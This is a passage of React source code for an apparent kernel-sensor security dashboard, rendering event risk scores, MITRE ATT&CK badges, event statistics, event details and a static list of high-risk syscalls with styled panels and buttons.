                            <div className="w-12 h-2 rounded-full overflow-hidden" style={{ background: 'linear-gradient(90deg, rgba(0,240,255,0.12), rgba(255,43,214,0.1))', border: '1px solid rgba(0,240,255,0.14)' }}>
                              <div 
                                className={`h-full ${
                                  event.risk_score >= 80 ? 'bg-red-500' :
                                  event.risk_score >= 60 ? 'bg-orange-500' :
                                  event.risk_score >= 40 ? 'bg-yellow-500' :
                                  'bg-green-500'
                                }`}
                                style={{ width: `${event.risk_score}%`, boxShadow: event.risk_score >= 80 ? '0 0 10px rgba(255,91,91,0.55)' : event.risk_score >= 60 ? '0 0 10px rgba(255,176,32,0.55)' : event.risk_score >= 40 ? '0 0 10px rgba(255,211,122,0.55)' : '0 0 10px rgba(57,255,20,0.55)' }}
                              />
                            </div>
                            <span className="sophia-flicker sophia-terminal-value text-sm" style={{ color: '#fff2d2' }}>{event.risk_score}</span>
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex gap-1">
                            {event.mitre_techniques?.slice(0, 2).map(t => (
                              <Badge 
                                key={t} 
                                variant="outline" 
                                className="text-xs border-0"
                                style={{ background: 'linear-gradient(135deg, rgba(255,43,214,0.22), rgba(255,176,32,0.14))', border: '1px solid rgba(255,43,214,0.46)', color: '#fff0fb', boxShadow: '0 0 10px rgba(255,43,214,0.12)' }}
                              >
                                {t}
                              </Badge>
                            ))}
                          </div>
                        </td>
                      </motion.tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Statistics */}
          {viewMode === 'stats' && stats && (
            <div className="space-y-4">
              <div className="rounded-xl p-4" style={KERNEL_PANEL_STYLE}>
                  <h3 className="sophia-scan sophia-terminal-label font-semibold mb-4" style={{ color: '#9efff0', textShadow: '0 0 10px rgba(57,255,20,0.28)' }}>Events by Type</h3>
                <div className="space-y-3">
                  {Object.entries(stats.events_by_type || {}).map(([type, count]) => (
                    <div key={type} className="flex items-center gap-3">
                      <span className={`sophia-scan sophia-terminal-label text-sm font-mono w-32 ${getEventTypeColor(type)}`}>{type}</span>
                      <div className="flex-1 h-4 rounded-full overflow-hidden" style={{ background: 'linear-gradient(90deg, rgba(0,240,255,0.1), rgba(255,43,214,0.08))', border: '1px solid rgba(0,240,255,0.16)', boxShadow: 'inset 0 0 10px rgba(0,240,255,0.06)' }}>
                        <div 
                          className={`h-full ${type.startsWith('process') ? 'bg-blue-500' : 
                            type.startsWith('file') ? 'bg-green-500' : 
                            type.startsWith('network') ? 'bg-purple-500' : 
                            type.startsWith('module') ? 'bg-red-500' : 
                            'bg-cyan-500'}`}
                          style={{ width: `${Math.min((count / stats.events_total) * 100 * 3, 100)}%`, boxShadow: type.startsWith('process') ? '0 0 14px rgba(0,240,255,0.52)' : type.startsWith('file') ? '0 0 14px rgba(57,255,20,0.52)' : type.startsWith('network') ? '0 0 14px rgba(188,19,254,0.52)' : type.startsWith('module') ? '0 0 14px rgba(255,43,214,0.52)' : '0 0 14px rgba(255,176,32,0.52)' }}
                        />
                      </div>
                      <span className="sophia-flicker sophia-terminal-value text-sm font-mono w-20 text-right" style={{ color: '#eafcff', textShadow: '0 0 10px rgba(0,240,255,0.25)' }}>{count.toLocaleString()}</span>
                    </div>
                  ))}
                </div>
              </div>
              
              <div className="grid grid-cols-2 gap-4">
                <div className="rounded-xl p-4" style={kernelScanSurface('linear-gradient(160deg, rgba(0,240,255,0.1), rgba(10,18,34,0.98))', 'rgba(0,240,255,0.3)', 'rgba(0,240,255,0.16)')}>
                  <h3 className="sophia-scan sophia-terminal-label font-semibold mb-3" style={{ color: '#aef7ff' }}>Platform Info</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#aef7ff' }}>Platform</span>
                      <span className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#ecfeff' }}>{stats.platform}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#ffd78a' }}>Kernel</span>
                      <span className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#fff2d2' }}>{stats.kernel_version}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#ffb8e9' }}>eBPF</span>
                      <Badge variant={stats.ebpf_available ? 'success' : 'destructive'}>
                        {stats.ebpf_available ? 'Available' : 'Unavailable'}
                      </Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#b8ffca' }}>Uptime</span>
                      <span className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#f1fff1' }}>{formatUptime(stats.uptime_seconds)}</span>
                    </div>
                  </div>
                </div>
                
                <div className="rounded-xl p-4" style={kernelScanSurface('linear-gradient(160deg, rgba(255,43,214,0.1), rgba(10,18,34,0.98))', 'rgba(255,43,214,0.32)', 'rgba(255,43,214,0.16)')}>
                  <h3 className="sophia-scan sophia-terminal-label font-semibold mb-3" style={{ color: '#ffb8e9' }}>Performance</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#aef7ff' }}>Total Events</span>
                      <span className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#ecfeff' }}>{stats.events_total?.toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#ffd78a' }}>Drop Rate</span>
                      <span className={`sophia-flicker sophia-terminal-value font-mono ${stats.events_dropped / stats.events_total > 0.01 ? 'text-orange-400' : 'text-green-400'}`}>
                        {((stats.events_dropped / stats.events_total) * 100).toFixed(3)}%
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#ffb8e9' }}>Events/sec</span>
                      <span className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#fff0fb' }}>{Math.round(stats.events_total / stats.uptime_seconds).toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="sophia-scan sophia-terminal-label" style={{ color: '#b8ffca' }}>Errors</span>
                      <span className={`sophia-flicker sophia-terminal-value font-mono ${stats.errors > 0 ? 'text-red-400' : 'text-green-400'}`}>{stats.errors}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Side Panel */}
        <div className="space-y-4">
          {/* Selected Event Details */}
          <AnimatePresence mode="wait">
            {selectedEvent && (
              <motion.div
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="rounded-xl p-4"
                style={kernelScanSurface('linear-gradient(160deg, rgba(0,240,255,0.1), rgba(10,18,34,0.98))', 'rgba(0,240,255,0.32)', 'rgba(0,240,255,0.16)')}
              >
                <h3 className="font-semibold mb-3 flex items-center gap-2">
                  <Eye className="h-4 w-4 text-cyan-400" />
                  Event Details
                </h3>
                <div className="space-y-3 text-sm">
                  <div>
                    <p className="sophia-scan sophia-terminal-label" style={{ color: '#aef7ff' }}>Event ID</p>
                    <p className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#ecfeff' }}>{selectedEvent.event_id}</p>
                  </div>
                  <div>
                    <p className="sophia-scan sophia-terminal-label" style={{ color: '#ffb8e9' }}>Type</p>
                    <p className={`sophia-flicker sophia-terminal-value font-mono ${getEventTypeColor(selectedEvent.event_type)}`}>
                      {selectedEvent.event_type}
                    </p>
                  </div>
                  <div>
                    <p className="sophia-scan sophia-terminal-label" style={{ color: '#b8ffca' }}>Process</p>
                    <p className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#f4fffb' }}>{selectedEvent.comm} (PID: {selectedEvent.pid})</p>
                  </div>
                  <div>
                    <p className="sophia-scan sophia-terminal-label" style={{ color: '#ffd78a' }}>User/Group</p>
                    <p className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#fff2d2' }}>UID: {selectedEvent.uid} / GID: {selectedEvent.gid}</p>
                  </div>
                  {selectedEvent.filename && (
                    <div>
                      <p className="sophia-scan sophia-terminal-label" style={{ color: '#aef7ff' }}>File</p>
                      <p className="sophia-flicker sophia-terminal-value font-mono text-xs break-all" style={{ color: '#ecfeff' }}>{selectedEvent.filename}</p>
                    </div>
                  )}
                  {selectedEvent.args && (
                    <div>
                      <p className="sophia-scan sophia-terminal-label" style={{ color: '#ffb8e9' }}>Arguments</p>
                      <p className="sophia-flicker sophia-terminal-value font-mono text-xs break-all" style={{ color: '#fff0fb' }}>{selectedEvent.args.join(' ')}</p>
                    </div>
                  )}
                  {selectedEvent.remote_addr && (
                    <div>
                      <p className="sophia-scan sophia-terminal-label" style={{ color: '#b8ffca' }}>Remote</p>
                      <p className="sophia-flicker sophia-terminal-value font-mono" style={{ color: '#f1fff1' }}>{selectedEvent.remote_addr}:{selectedEvent.remote_port}</p>
                    </div>
                  )}
                  <div>
                    <p className="sophia-scan sophia-terminal-label" style={{ color: '#ffd78a' }}>Risk Score</p>
                    <div className="flex items-center gap-2 mt-1">
                      <div className="flex-1 h-2 rounded-full overflow-hidden" style={{ background: 'linear-gradient(90deg, rgba(0,240,255,0.12), rgba(255,43,214,0.1))', border: '1px solid rgba(255,176,32,0.18)' }}>
                        <div 
                          className={`h-full ${
                            selectedEvent.risk_score >= 80 ? 'bg-red-500' :
                            selectedEvent.risk_score >= 60 ? 'bg-orange-500' :
                            'bg-yellow-500'
                          }`}
                          style={{ width: `${selectedEvent.risk_score}%`, boxShadow: selectedEvent.risk_score >= 80 ? '0 0 10px rgba(255,91,91,0.55)' : selectedEvent.risk_score >= 60 ? '0 0 10px rgba(255,176,32,0.55)' : '0 0 10px rgba(255,211,122,0.55)' }}
                        />
                      </div>
                      <span className="sophia-flicker sophia-terminal-value font-bold" style={{ color: '#fff2d2' }}>{selectedEvent.risk_score}</span>
                    </div>
                  </div>
                  {selectedEvent.mitre_techniques?.length > 0 && (
                    <div>
                      <p className="sophia-scan sophia-terminal-label" style={{ color: '#ffb8e9', marginBottom: 4 }}>MITRE ATT&CK</p>
                      <div className="flex flex-wrap gap-1">
                        {selectedEvent.mitre_techniques.map(t => (
                          <Badge key={t} variant="destructive" className="text-xs" style={{ background: 'linear-gradient(135deg, rgba(255,43,214,0.24), rgba(255,176,32,0.16))', border: '1px solid rgba(255,43,214,0.42)', color: '#fff0fb', boxShadow: '0 0 10px rgba(255,43,214,0.12)' }}>
                            {t}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* High Risk Syscalls */}
          <div className="rounded-xl p-4" style={{ ...KERNEL_PANEL_STYLE, border: '1px solid rgba(255,43,214,0.4)', boxShadow: '0 0 18px rgba(255,43,214,0.12), inset 0 0 18px rgba(0,240,255,0.05)' }}>
            <h3 className="font-semibold mb-3 flex items-center gap-2">
              <AlertOctagon className="h-4 w-4 text-red-400" />
              High Risk Syscalls
            </h3>
            <div className="space-y-2">
              {[
                { name: 'ptrace', desc: 'Process injection', count: 12 },
                { name: 'mprotect', desc: 'Memory protection change', count: 8 },
                { name: 'execve', desc: 'Process execution', count: 45 },
                { name: 'init_module', desc: 'Kernel module load', count: 3 },
                { name: 'memfd_create', desc: 'Fileless execution', count: 5 }
              ].map((syscall, index) => {
                const rowTones = [
                  { border: 'rgba(0,240,255,0.44)', bg: 'linear-gradient(135deg, rgba(0,240,255,0.12), rgba(8,18,34,0.9))', text: '#9fefff', badge: 'linear-gradient(135deg, rgba(0,240,255,0.26), rgba(255,255,255,0.08))', badgeBorder: 'rgba(0,240,255,0.74)', badgeText: '#eafcff' },
                  { border: 'rgba(57,255,20,0.44)', bg: 'linear-gradient(135deg, rgba(57,255,20,0.12), rgba(8,18,34,0.9))', text: '#b8ffca', badge: 'linear-gradient(135deg, rgba(57,255,20,0.26), rgba(255,255,255,0.08))', badgeBorder: 'rgba(57,255,20,0.74)', badgeText: '#f1fff1' },
                  { border: 'rgba(255,43,214,0.44)', bg: 'linear-gradient(135deg, rgba(255,43,214,0.12), rgba(8,18,34,0.9))', text: '#ffb8e9', badge: 'linear-gradient(135deg, rgba(255,43,214,0.26), rgba(255,255,255,0.08))', badgeBorder: 'rgba(255,43,214,0.74)', badgeText: '#fff0fb' },
                  { border: 'rgba(255,176,32,0.44)', bg: 'linear-gradient(135deg, rgba(255,176,32,0.12), rgba(8,18,34,0.9))', text: '#ffd78a', badge: 'linear-gradient(135deg, rgba(255,176,32,0.26), rgba(255,255,255,0.08))', badgeBorder: 'rgba(255,176,32,0.74)', badgeText: '#fff7e8' },
                ];
                const tone = rowTones[index % rowTones.length];
                return (
                <div key={syscall.name} className="flex items-center justify-between p-2 rounded-lg" style={{ background: tone.bg, border: `1px solid ${tone.border}`, boxShadow: `0 0 12px ${tone.border.replace('0.44', '0.16')}` }}>
                  <div>
                    <span className="text-sm font-mono" style={{ color: tone.text, textShadow: `0 0 10px ${tone.border}` }}>{syscall.name}</span>
                    <p className="text-xs" style={{ color: '#dff8ff', opacity: 0.88 }}>{syscall.desc}</p>
                  </div>
                  <Badge variant="outline" className="border-0" style={{ background: tone.badge, border: `1px solid ${tone.badgeBorder}`, color: tone.badgeText, boxShadow: `0 0 14px ${tone.badgeBorder.replace('0.74', '0.24')}, inset 0 0 10px rgba(255,255,255,0.05)` }}>
                    {syscall.count}
                  </Badge>
                </div>
              )})}
            </div>
          </div>

          {/* Quick Actions */}
          <div className="rounded-xl p-4" style={{ ...KERNEL_PANEL_STYLE, border: '1px solid rgba(255,176,32,0.36)' }}>
            <h3 className="font-semibold mb-3" style={{ color: '#ffd78a' }}>Quick Actions</h3>
            <div className="space-y-2">
              <Button variant="outline" className="w-full justify-start border-0" style={{ background: 'linear-gradient(135deg, rgba(0,240,255,0.12), rgba(8,18,34,0.96))', border: '1px solid rgba(0,240,255,0.34)', color: '#dff8ff', boxShadow: '0 0 14px rgba(0,240,255,0.12)' }}>
                <Play className="h-4 w-4 mr-2" />
                Start All Sensors
              </Button>
              <Button variant="outline" className="w-full justify-start border-0" style={{ background: 'linear-gradient(135deg, rgba(255,43,214,0.12), rgba(8,18,34,0.96))', border: '1px solid rgba(255,43,214,0.34)', color: '#fff0fb', boxShadow: '0 0 14px rgba(255,43,214,0.12)' }}>
                <Pause className="h-4 w-4 mr-2" />
                Stop All Sensors
              </Button>
              <Button variant="outline" className="w-full justify-start border-0" style={{ background: 'linear-gradient(135deg, rgba(255,176,32,0.12), rgba(8,18,34,0.96))', border: '1px solid rgba(255,176,32,0.34)', color: '#fff7e8', boxShadow: '0 0 14px rgba(255,176,32,0.12)' }}>
                <Database className="h-4 w-4 mr-2" />
                Export Events
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default KernelSensorsPage;
